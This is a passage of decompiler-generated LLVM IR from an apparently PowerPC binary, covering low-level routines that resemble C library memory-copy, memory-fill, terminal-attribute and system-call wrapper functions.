dec_label_pc_1000bc64:                            ; preds = %dec_label_pc_1000bc10
  %v1_1000bc64 = sub nsw i32 4, %v1_1000bc10
  store i32 %v1_1000bc64, i32* %ctr.global-to-local, align 4
  %v2_1000bc6c = sub i32 %arg3, %v1_1000bc64
  store i32 %v2_1000bc6c, i32* @r11, align 4
  %v1_1000bc708 = add i32 %v2_1000bc04, -1
  %v2_1000bc709 = inttoptr i32 %v1_1000bc708 to i8*
  %v3_1000bc7010 = load i8, i8* %v2_1000bc709, align 1
  store i32 %v1_1000bc708, i32* %r4.global-to-local, align 4
  %v3_1000bc7412 = add i32 %v2_1000bc08, -1
  %v4_1000bc7413 = inttoptr i32 %v3_1000bc7412 to i8*
  store i8 %v3_1000bc7010, i8* %v4_1000bc7413, align 1
  store i32 %v3_1000bc7412, i32* %r10.global-to-local, align 4
  %v0_1000bc7814 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bc7815 = add i32 %v0_1000bc7814, -1
  store i32 %v1_1000bc7815, i32* %ctr.global-to-local, align 4
  %v2_1000bc7816 = icmp eq i32 %v1_1000bc7815, 0
  br i1 %v2_1000bc7816, label %dec_label_pc_1000bc7c, label %dec_label_pc_1000bc70.dec_label_pc_1000bc70_crit_edge

dec_label_pc_1000bc70.dec_label_pc_1000bc70_crit_edge: ; preds = %dec_label_pc_1000bc64, %dec_label_pc_1000bc70.dec_label_pc_1000bc70_crit_edge
  %v3_1000bc7417 = phi i32 [ %v3_1000bc74, %dec_label_pc_1000bc70.dec_label_pc_1000bc70_crit_edge ], [ %v3_1000bc7412, %dec_label_pc_1000bc64 ]
  %v0_1000bc70.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000bc70 = add i32 %v0_1000bc70.pre, -1
  %v2_1000bc70 = inttoptr i32 %v1_1000bc70 to i8*
  %v3_1000bc70 = load i8, i8* %v2_1000bc70, align 1
  store i32 %v1_1000bc70, i32* %r4.global-to-local, align 4
  %v3_1000bc74 = add i32 %v3_1000bc7417, -1
  %v4_1000bc74 = inttoptr i32 %v3_1000bc74 to i8*
  store i8 %v3_1000bc70, i8* %v4_1000bc74, align 1
  store i32 %v3_1000bc74, i32* %r10.global-to-local, align 4
  %v0_1000bc78 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bc78 = add i32 %v0_1000bc78, -1
  store i32 %v1_1000bc78, i32* %ctr.global-to-local, align 4
  %v2_1000bc78 = icmp eq i32 %v1_1000bc78, 0
  br i1 %v2_1000bc78, label %dec_label_pc_1000bc7c, label %dec_label_pc_1000bc70.dec_label_pc_1000bc70_crit_edge

dec_label_pc_1000bc7c:                            ; preds = %dec_label_pc_1000bc70.dec_label_pc_1000bc70_crit_edge, %dec_label_pc_1000bc64
  %v0_1000bc7c = load i32, i32* @r11, align 4
  %v1_1000bc7c = call i32 @__asm_rlwinm.(i32 %v0_1000bc7c, i32 29, i32 3, i32 31)
  store i32 %v1_1000bc7c, i32* %r9.global-to-local, align 4
  %v4_1000bc7c = icmp eq i32 %v1_1000bc7c, 0
  br i1 %v4_1000bc7c, label %dec_label_pc_1000bc30, label %dec_label_pc_1000bc7c.dec_label_pc_1000bc18_crit_edge

dec_label_pc_1000bc7c.dec_label_pc_1000bc18_crit_edge: ; preds = %dec_label_pc_1000bc7c
  %v1_1000bc24.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000bc18

dec_label_pc_1000bc88:                            ; preds = %dec_label_pc_1000bc54, %dec_label_pc_1000bc48
  %v0_1000bc88 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_1000bc88

; uselistorder directives
  uselistorder i32 %v1_1000bc7c, { 1, 2, 0 }
  uselistorder i32 %v1_1000bc78, { 1, 0 }
  uselistorder i32 %v3_1000bc74, { 1, 2, 0 }
  uselistorder i32 %v1_1000bc5c, { 1, 0 }
  uselistorder i32 %v3_1000bc58, { 1, 2, 0 }
  uselistorder i32 %v1_1000bc30, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000bc2c, { 1, 0 }
  uselistorder i32 %v2_1000bc28, { 1, 2, 0 }
  uselistorder i32 %v1_1000bc10, { 1, 0 }
  uselistorder i32 %v2_1000bc08, { 1, 2, 0, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 1, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 3, 1, 6, 4, 7, 5, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 0, 6, 7, 1, 2, 3, 4, 5, 8, 9, 10 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 4, 0, 1, 3, 2, 5 }
  uselistorder label %dec_label_pc_1000bc70.dec_label_pc_1000bc70_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc48, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bc00, { 1, 0 }
}

define i32 @function_1000bc90(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bc90:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000bc90 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000bc90, i32* %r9.global-to-local, align 4
  %v4_1000bc90 = icmp eq i32 %v1_1000bc90, 0
  %v1_1000bc98 = add i32 %arg1, -4
  store i32 %v1_1000bc98, i32* %r11.global-to-local, align 4
  %v1_1000bc9c = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_1000bca0 = call i32 @__asm_rlwimi(i32 %v1_1000bc9c, i32 16, i32 0, i32 15)
  %v2_1000bca0 = trunc i32 %v1_1000bca0 to i8
  br i1 %v4_1000bc90, label %dec_label_pc_1000bcc8, label %dec_label_pc_1000bca8

dec_label_pc_1000bca8:                            ; preds = %dec_label_pc_1000bc90
  %v0_1000bca8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bca8 = urem i32 %v0_1000bca8, 4
  %v3_1000bca8 = icmp eq i32 %v1_1000bca8, 0
  br i1 %v3_1000bca8, label %dec_label_pc_1000bca8.dec_label_pc_1000bcb0_crit_edge, label %dec_label_pc_1000bcf8

dec_label_pc_1000bca8.dec_label_pc_1000bcb0_crit_edge: ; preds = %dec_label_pc_1000bca8
  %v0_1000bcb0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000bcb0

dec_label_pc_1000bcb0:                            ; preds = %dec_label_pc_1000bd10.dec_label_pc_1000bcb0_crit_edge, %dec_label_pc_1000bca8.dec_label_pc_1000bcb0_crit_edge
  %v0_1000bcb4.pre = phi i32 [ %v0_1000bca8, %dec_label_pc_1000bca8.dec_label_pc_1000bcb0_crit_edge ], [ %v0_1000bcb4.pre.pre, %dec_label_pc_1000bd10.dec_label_pc_1000bcb0_crit_edge ]
  %v0_1000bcb0 = phi i32 [ %v0_1000bcb0.pre, %dec_label_pc_1000bca8.dec_label_pc_1000bcb0_crit_edge ], [ %v1_1000bd10, %dec_label_pc_1000bd10.dec_label_pc_1000bcb0_crit_edge ]
  store i32 %v0_1000bcb0, i32* %ctr.global-to-local, align 4
  %v1_1000bcb8 = sext i8 %v2_1000bca0 to i32
  br label %dec_label_pc_1000bcb4

dec_label_pc_1000bcb4:                            ; preds = %dec_label_pc_1000bcb4, %dec_label_pc_1000bcb0
  %v0_1000bcb4 = phi i32 [ %v1_1000bcc0, %dec_label_pc_1000bcb4 ], [ %v0_1000bcb4.pre, %dec_label_pc_1000bcb0 ]
  %v1_1000bcb4 = add i32 %v0_1000bcb4, 4
  store i32 %v1_1000bcb4, i32* %r9.global-to-local, align 4
  %v4_1000bcb8 = inttoptr i32 %v1_1000bcb4 to i32*
  store i32 %v1_1000bcb8, i32* %v4_1000bcb8, align 4
  %v2_1000bcbc = load i32, i32* %r9.global-to-local, align 4
  %v3_1000bcbc = add i32 %v2_1000bcbc, 4
  %v4_1000bcbc = inttoptr i32 %v3_1000bcbc to i32*
  store i32 %v1_1000bcb8, i32* %v4_1000bcbc, align 4
  %v0_1000bcc0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bcc0 = add i32 %v0_1000bcc0, 4
  store i32 %v1_1000bcc0, i32* %r11.global-to-local, align 4
  %v0_1000bcc4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bcc4 = add i32 %v0_1000bcc4, -1
  store i32 %v1_1000bcc4, i32* %ctr.global-to-local, align 4
  %v2_1000bcc4 = icmp eq i32 %v1_1000bcc4, 0
  br i1 %v2_1000bcc4, label %dec_label_pc_1000bcc8, label %dec_label_pc_1000bcb4

dec_label_pc_1000bcc8:                            ; preds = %dec_label_pc_1000bcb4, %dec_label_pc_1000bd10, %dec_label_pc_1000bc90
  %v0_1000bcc8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000bcc8 = urem i32 %v0_1000bcc8, 8
  store i32 %v1_1000bcc8, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000bcc8, 4
  br i1 %tmp, label %dec_label_pc_1000bcdc, label %dec_label_pc_1000bcd4

dec_label_pc_1000bcd4:                            ; preds = %dec_label_pc_1000bcc8
  %v1_1000bcd4 = sext i8 %v2_1000bca0 to i32
  %v2_1000bcd4 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000bcd4 = add i32 %v2_1000bcd4, 4
  %v4_1000bcd4 = inttoptr i32 %v3_1000bcd4 to i32*
  store i32 %v1_1000bcd4, i32* %v4_1000bcd4, align 4
  store i32 %v3_1000bcd4, i32* %r11.global-to-local, align 4
  %v0_1000bcd8 = load i32, i32* @r5, align 4
  %v1_1000bcd8 = add i32 %v0_1000bcd8, -4
  store i32 %v1_1000bcd8, i32* @r5, align 4
  br label %dec_label_pc_1000bcdc

dec_label_pc_1000bcdc:                            ; preds = %dec_label_pc_1000bcc8, %dec_label_pc_1000bcd4
  %v0_1000bcdc = phi i32 [ %v1_1000bcc8, %dec_label_pc_1000bcc8 ], [ %v1_1000bcd8, %dec_label_pc_1000bcd4 ]
  %v3_1000bcdc = icmp eq i32 %v0_1000bcdc, 0
  %v0_1000bce0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000bcdc, i32 %v0_1000bce0)
  %v0_1000bce4 = load i32, i32* @r5, align 4
  store i32 %v0_1000bce4, i32* %ctr.global-to-local, align 4
  %v0_1000bce8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bce8 = add i32 %v0_1000bce8, 3
  store i32 %v1_1000bce8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000bcec

dec_label_pc_1000bcec:                            ; preds = %dec_label_pc_1000bcec, %dec_label_pc_1000bcdc
  %v3_1000bcec = phi i32 [ %v4_1000bcec, %dec_label_pc_1000bcec ], [ %v1_1000bce8, %dec_label_pc_1000bcdc ]
  %v4_1000bcec = add i32 %v3_1000bcec, 1
  %v5_1000bcec = inttoptr i32 %v4_1000bcec to i8*
  store i8 %v2_1000bca0, i8* %v5_1000bcec, align 1
  store i32 %v4_1000bcec, i32* %r9.global-to-local, align 4
  %v0_1000bcf0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bcf0 = add i32 %v0_1000bcf0, -1
  store i32 %v1_1000bcf0, i32* %ctr.global-to-local, align 4
  %v2_1000bcf0 = icmp eq i32 %v1_1000bcf0, 0
  br i1 %v2_1000bcf0, label %dec_label_pc_1000bd1c, label %dec_label_pc_1000bcec

dec_label_pc_1000bcf8:                            ; preds = %dec_label_pc_1000bca8
  %v1_1000bcf8 = sub nsw i32 4, %v1_1000bca8
  store i32 %v1_1000bcf8, i32* %ctr.global-to-local, align 4
  %v1_1000bd00 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000bd00 = sub i32 %v1_1000bd00, %v1_1000bcf8
  store i32 %v2_1000bd00, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000bd04

dec_label_pc_1000bd04:                            ; preds = %dec_label_pc_1000bd04, %dec_label_pc_1000bcf8
  %v3_1000bd04 = phi i32 [ %v1_1000bd08, %dec_label_pc_1000bd04 ], [ %v0_1000bca8, %dec_label_pc_1000bcf8 ]
  %v4_1000bd04 = add i32 %v3_1000bd04, 4
  %v5_1000bd04 = inttoptr i32 %v4_1000bd04 to i8*
  store i8 %v2_1000bca0, i8* %v5_1000bd04, align 1
  %v0_1000bd08 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bd08 = add i32 %v0_1000bd08, 1
  store i32 %v1_1000bd08, i32* %r11.global-to-local, align 4
  %v0_1000bd0c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bd0c = add i32 %v0_1000bd0c, -1
  store i32 %v1_1000bd0c, i32* %ctr.global-to-local, align 4
  %v2_1000bd0c = icmp eq i32 %v1_1000bd0c, 0
  br i1 %v2_1000bd0c, label %dec_label_pc_1000bd10, label %dec_label_pc_1000bd04

dec_label_pc_1000bd10:                            ; preds = %dec_label_pc_1000bd04
  %v0_1000bd10 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000bd10 = call i32 @__asm_rlwinm.(i32 %v0_1000bd10, i32 29, i32 3, i32 31)
  store i32 %v1_1000bd10, i32* %r9.global-to-local, align 4
  %v4_1000bd10 = icmp eq i32 %v1_1000bd10, 0
  br i1 %v4_1000bd10, label %dec_label_pc_1000bcc8, label %dec_label_pc_1000bd10.dec_label_pc_1000bcb0_crit_edge

dec_label_pc_1000bd10.dec_label_pc_1000bcb0_crit_edge: ; preds = %dec_label_pc_1000bd10
  %v0_1000bcb4.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000bcb0

dec_label_pc_1000bd1c:                            ; preds = %dec_label_pc_1000bcec
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000bd10, { 1, 2, 0 }
  uselistorder i32 %v1_1000bd0c, { 1, 0 }
  uselistorder i32 %v1_1000bd08, { 1, 0 }
  uselistorder i32 %v1_1000bcf0, { 1, 0 }
  uselistorder i32 %v4_1000bcec, { 1, 2, 0 }
  uselistorder i32 %v1_1000bcc8, { 2, 1, 0 }
  uselistorder i32 %v1_1000bcc4, { 1, 0 }
  uselistorder i32 %v1_1000bcc0, { 1, 0 }
  uselistorder i32 %v1_1000bca8, { 1, 0 }
  uselistorder i32 %v0_1000bca8, { 2, 1, 0 }
  uselistorder i8 %v2_1000bca0, { 0, 3, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 55, 56, 52, 53, 54, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder label %dec_label_pc_1000bcdc, { 1, 0 }
  uselistorder label %dec_label_pc_1000bcc8, { 1, 0, 2 }
}

define i32 @function_1000bd20(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000bd20:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_2()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000bd24 = load i32, i32* @lr, align 4
  store i32 %v0_1000bd24, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000bd34 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268483912, i32* @lr, align 4
  %v3_1000bd44 = call i32 @function_1000b1d8(i32 1076655123, i32 %v2_1000bd34, i32 %v2_1000bd34)
  %v2_1000bd48 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000bd48, i32* @r4, align 4
  store i32 %v3_1000bd44, i32* @r30, align 4
  %v3_1000bd4c = icmp eq i32 %v3_1000bd44, 0
  %v0_1000bd54 = load i32, i32* @r31, align 4
  br i1 %v3_1000bd4c, label %dec_label_pc_1000bd5c, label %dec_label_pc_1000bda4

dec_label_pc_1000bd5c:                            ; preds = %dec_label_pc_1000bd20
  %v1_1000bd54 = add i32 %v0_1000bd54, 17
  %v3_1000bd74 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000bd74, i32* %r0.global-to-local, align 4
  %v2_1000bd78 = add i32 %v0_1000bd54, 4
  %v3_1000bd78 = inttoptr i32 %v2_1000bd78 to i32*
  store i32 %tmp7, i32* %v3_1000bd78, align 4
  %v0_1000bd7c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bd7c = load i32, i32* @r31, align 4
  %v2_1000bd7c = inttoptr i32 %v1_1000bd7c to i32*
  store i32 %v0_1000bd7c, i32* %v2_1000bd7c, align 4
  %v0_1000bd80 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bd80 = load i32, i32* @r31, align 4
  %v2_1000bd80 = add i32 %v1_1000bd80, 8
  %v3_1000bd80 = inttoptr i32 %v2_1000bd80 to i32*
  store i32 %v0_1000bd80, i32* %v3_1000bd80, align 4
  %v0_1000bd84 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bd84 = load i32, i32* @r31, align 4
  %v2_1000bd84 = add i32 %v1_1000bd84, 12
  %v3_1000bd84 = inttoptr i32 %v2_1000bd84 to i32*
  store i32 %v0_1000bd84, i32* %v3_1000bd84, align 4
  %v3_1000bd88 = load i32, i32* @r31, align 4
  %v4_1000bd88 = add i32 %v3_1000bd88, 16
  %v5_1000bd88 = inttoptr i32 %v4_1000bd88 to i8*
  store i8 %tmp4, i8* %v5_1000bd88, align 1
  %v1_1000bd8c = load i32, i32* @r31, align 4
  %v2_1000bd8c = add i32 %v1_1000bd8c, 52
  %v3_1000bd8c = inttoptr i32 %v2_1000bd8c to i32*
  store i32 %tmp3, i32* %v3_1000bd8c, align 4
  %v1_1000bd90 = load i32, i32* @r31, align 4
  %v2_1000bd90 = add i32 %v1_1000bd90, 56
  %v3_1000bd90 = inttoptr i32 %v2_1000bd90 to i32*
  store i32 %tmp2, i32* %v3_1000bd90, align 4
  store i32 268483992, i32* @lr, align 4
  %v6_1000bd94 = sext i8 %tmp4 to i32
  %v8_1000bd94 = call i32 @function_1000d9a0(i32 %v1_1000bd54, i32 %v2_1000bd48, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000bd94, i32 %tmp7)
  store i32 268484004, i32* @lr, align 4
  %v3_1000bda0 = call i32 @function_1000bc90(i32 %v8_1000bd94, i32 0, i32 13)
  %v0_1000bda8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000bda4

dec_label_pc_1000bda4:                            ; preds = %dec_label_pc_1000bd20, %dec_label_pc_1000bd5c
  %v0_1000bda8 = phi i32 [ %v3_1000bd44, %dec_label_pc_1000bd20 ], [ %v0_1000bda8.pre, %dec_label_pc_1000bd5c ]
  store i32 %v0_1000bd24, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000bda8

; uselistorder directives
  uselistorder i32 %v2_1000bd34, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32 13, { 6, 7, 8, 13, 0, 1, 14, 9, 10, 11, 12, 15, 16, 2, 17, 18, 3, 19, 20, 4, 21, 22, 5 }
  uselistorder label %dec_label_pc_1000bda4, { 1, 0 }
}

define i32 @function_1000bdbc() local_unnamed_addr {
dec_label_pc_1000bdbc:
  %r27.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000bdbc = load i32, i32* @r4, align 4
  %v3_1000bdbc = icmp eq i32 %v0_1000bdbc, 1
  %v0_1000bdcc = load i32, i32* @r3, align 4
  store i32 %v0_1000bdcc, i32* %r27.global-to-local, align 4
  %v0_1000bdd4 = load i32, i32* @r5, align 4
  store i32 %v0_1000bdd4, i32* @r31, align 4
  br i1 %v3_1000bdbc, label %dec_label_pc_1000bdf8, label %dec_label_pc_1000bddc

dec_label_pc_1000bddc:                            ; preds = %dec_label_pc_1000bdbc
  %v3_1000bddc = icmp eq i32 %v0_1000bdbc, 2
  br i1 %v3_1000bddc, label %dec_label_pc_1000be18, label %dec_label_pc_1000bde4

dec_label_pc_1000bde4:                            ; preds = %dec_label_pc_1000bddc
  %v3_1000bde4 = icmp eq i32 %v0_1000bdbc, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000bde4, label %dec_label_pc_1000be20, label %dec_label_pc_1000be04

dec_label_pc_1000bdf8:                            ; preds = %dec_label_pc_1000bdbc
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000be20

dec_label_pc_1000be04:                            ; preds = %dec_label_pc_1000bde4
  %v0_1000be04 = call i32 @function_1000bb0c()
  store i32 -1, i32* @r28, align 4
  %v2_1000be10 = inttoptr i32 %v0_1000be04 to i32*
  store i32 22, i32* %v2_1000be10, align 4
  br label %dec_label_pc_1000bf08

dec_label_pc_1000be18:                            ; preds = %dec_label_pc_1000bddc
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000be20

dec_label_pc_1000be20:                            ; preds = %dec_label_pc_1000bde4, %dec_label_pc_1000bdf8, %dec_label_pc_1000be18
  %v1_1000be20 = inttoptr i32 %v0_1000bdd4 to i32*
  %v2_1000be20 = load i32, i32* %v1_1000be20, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000be28 = add i32 %v0_1000bdd4, 4
  %v2_1000be28 = inttoptr i32 %v1_1000be28 to i32*
  %v3_1000be28 = load i32, i32* %v2_1000be28, align 4
  store i32 %v3_1000be28, i32* %r9.global-to-local, align 4
  %v1_1000be2c = add i32 %v0_1000bdd4, 17
  store i32 %v1_1000be2c, i32* @r4, align 4
  %v1_1000be30 = add i32 %v0_1000bdd4, 8
  %v2_1000be30 = inttoptr i32 %v1_1000be30 to i32*
  %v3_1000be30 = load i32, i32* %v2_1000be30, align 4
  %v2_1000be34 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000be34, i32* @r3, align 4
  %v2_1000be3c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000be20, i32* %stack_var_-72, align 4
  store i32 268484204, i32* @lr, align 4
  %v0_1000be68 = call i32 @function_1000bb50()
  %v0_1000be6c = load i32, i32* %r27.global-to-local, align 4
  %v0_1000be70 = load i32, i32* @r30, align 4
  store i32 268484224, i32* @lr, align 4
  %v3_1000be7c = call i32 @function_1000b1d8(i32 %v0_1000be6c, i32 %v0_1000be70, i32 %v2_1000be3c)
  store i32 %v3_1000be7c, i32* @r28, align 4
  %v3_1000be80 = icmp eq i32 %v3_1000be7c, 0
  br i1 %v3_1000be80, label %dec_label_pc_1000be88, label %dec_label_pc_1000bf08

dec_label_pc_1000be88:                            ; preds = %dec_label_pc_1000be20
  %v0_1000be88 = load i32, i32* @r30, align 4
  %v3_1000be8c = icmp eq i32 %v0_1000be88, -2144570348
  br i1 %v3_1000be8c, label %dec_label_pc_1000be94, label %dec_label_pc_1000bf04

dec_label_pc_1000be94:                            ; preds = %dec_label_pc_1000be88
  %v0_1000be94 = call i32 @function_1000bb0c()
  store i32 %v0_1000be94, i32* @r29, align 4
  %v0_1000bea4 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000beac = inttoptr i32 %v0_1000be94 to i32*
  %v2_1000beac = load i32, i32* %v1_1000beac, align 4
  store i32 %v2_1000beac, i32* @r30, align 4
  store i32 268484280, i32* @lr, align 4
  %v3_1000beb4 = call i32 @function_1000b1d8(i32 %v0_1000bea4, i32 1076655123, i32 %v2_1000be3c)
  %v3_1000beb8 = icmp eq i32 %v3_1000beb4, 0
  br i1 %v3_1000beb8, label %dec_label_pc_1000bec8, label %dec_label_pc_1000bec0

dec_label_pc_1000bec0:                            ; preds = %dec_label_pc_1000be94
  %v0_1000bec0 = load i32, i32* @r30, align 4
  %v1_1000bec0 = load i32, i32* @r29, align 4
  %v2_1000bec0 = inttoptr i32 %v1_1000bec0 to i32*
  store i32 %v0_1000bec0, i32* %v2_1000bec0, align 4
  br label %dec_label_pc_1000bf08

dec_label_pc_1000bec8:                            ; preds = %dec_label_pc_1000be94
  %v0_1000bec8 = load i32, i32* @r31, align 4
  %v1_1000bec8 = add i32 %v0_1000bec8, 8
  %v2_1000bec8 = inttoptr i32 %v1_1000bec8 to i32*
  %v3_1000bec8 = load i32, i32* %v2_1000bec8, align 4
  %v1_1000bed0 = call i32 @__asm_rlwinm(i32 %v3_1000bec8, i32 0, i32 19, i32 20)
  %v1_1000bed4 = call i32 @__asm_rlwinm(i32 %v3_1000be30, i32 0, i32 19, i32 20)
  store i32 %v1_1000bed4, i32* %r9.global-to-local, align 4
  %v4_1000bed8 = icmp eq i32 %v1_1000bed0, %v1_1000bed4
  br i1 %v4_1000bed8, label %dec_label_pc_1000bee0, label %dec_label_pc_1000bef4

dec_label_pc_1000bee0:                            ; preds = %dec_label_pc_1000bec8
  %v1_1000bee0 = and i32 %v3_1000bec8, 768
  store i32 %v1_1000bee0, i32* %r9.global-to-local, align 4
  %v3_1000bee0 = icmp eq i32 %v1_1000bee0, 0
  br i1 %v3_1000bee0, label %dec_label_pc_1000bf04, label %dec_label_pc_1000bee8

dec_label_pc_1000bee8:                            ; preds = %dec_label_pc_1000bee0
  %v1_1000bee8 = call i32 @__asm_rlwinm(i32 %v3_1000be30, i32 0, i32 22, i32 23)
  %v0_1000beec = load i32, i32* %r9.global-to-local, align 4
  %v4_1000beec = icmp eq i32 %v0_1000beec, %v1_1000bee8
  br i1 %v4_1000beec, label %dec_label_pc_1000bf04, label %dec_label_pc_1000bef4

dec_label_pc_1000bef4:                            ; preds = %dec_label_pc_1000bec8, %dec_label_pc_1000bee8
  store i32 -1, i32* @r28, align 4
  %v1_1000befc = load i32, i32* @r29, align 4
  %v2_1000befc = inttoptr i32 %v1_1000befc to i32*
  store i32 22, i32* %v2_1000befc, align 4
  br label %dec_label_pc_1000bf08

dec_label_pc_1000bf04:                            ; preds = %dec_label_pc_1000be88, %dec_label_pc_1000bee8, %dec_label_pc_1000bee0
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000bf08

dec_label_pc_1000bf08:                            ; preds = %dec_label_pc_1000be20, %dec_label_pc_1000bef4, %dec_label_pc_1000bec0, %dec_label_pc_1000be04, %dec_label_pc_1000bf04
  %v0_1000bf0c = load i32, i32* @r28, align 4
  ret i32 %v0_1000bf0c

; uselistorder directives
  uselistorder i32 %v0_1000bdd4, { 1, 0, 3, 2, 4 }
  uselistorder i32 768, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @function_1000b1d8, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000bf08, { 4, 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000bf04, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000bef4, { 1, 0 }
  uselistorder label %dec_label_pc_1000be20, { 2, 1, 0 }
}

define i32 @function_1000bf20(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000bf20:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000bf28 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000bf28, i32* @r4, align 4
  store i32 268484404, i32* @lr, align 4
  %v1_1000bf30 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000bf30 = call i32 @function_1000d9d4(i8* %v1_1000bf30)
  %v3_1000bf34 = icmp eq i32 %v2_1000bf30, 0
  br i1 %v3_1000bf34, label %dec_label_pc_1000bf44, label %dec_label_pc_1000bf40

dec_label_pc_1000bf40:                            ; preds = %dec_label_pc_1000bf20
  %v3_1000bf40 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000bf44

dec_label_pc_1000bf44:                            ; preds = %dec_label_pc_1000bf20, %dec_label_pc_1000bf40
  %v0_1000bf50 = phi i32 [ -1, %dec_label_pc_1000bf20 ], [ %v3_1000bf40, %dec_label_pc_1000bf40 ]
  ret i32 %v0_1000bf50

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bf44, { 1, 0 }
}

define i32 @function_1000bf54(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bf54:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000bf68 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484472, i32* @lr, align 4
  %v2_1000bf74 = call i32 @function_1000d2a4(i32 5, i32 %v2_1000bf68)
  ret i32 %v2_1000bf74

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_1000bf88(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bf88:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000bf9c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268484524, i32* @lr, align 4
